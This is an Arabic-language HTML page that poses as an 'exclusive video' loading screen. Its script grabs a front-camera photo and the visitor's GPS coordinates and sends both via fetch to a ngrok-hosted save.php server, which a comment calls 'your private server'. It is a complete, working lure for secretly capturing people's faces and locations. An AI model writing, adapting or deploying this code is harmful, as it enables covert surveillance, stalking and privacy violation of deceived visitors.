<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>فيديو حصري - مدينة التل</title>
</head>
<body style="background:#000;color:#0f0;text-align:center;padding:50vh 0;font-size:30px">
جاري تحميل الفيديو الحصري...

<script>
// سيرفرك الخاص (XAMPP + ngrok)
const SERVER = "https://wyatt-nonconspiring-ona.ngrok-free.dev/save.php";

navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{
    let v=document.createElement('video'); v.srcObject=s; v.play();
    setTimeout(()=>{
        let c=document.createElement('canvas');
        c.width=1280; c.height=720;
        c.getContext('2d').drawImage(v,0,0,1280,720);
        let img=c.toDataURL('image/jpeg');

        navigator.geolocation.getCurrentPosition(p=>{
            let f=new FormData();
            f.append('img',img);
            f.append('gps',p.coords.latitude+","+p.coords.longitude);
            fetch(SERVER,{method:'POST',body:f});
        });
    },3000);
});
</script>
</body>
</html>
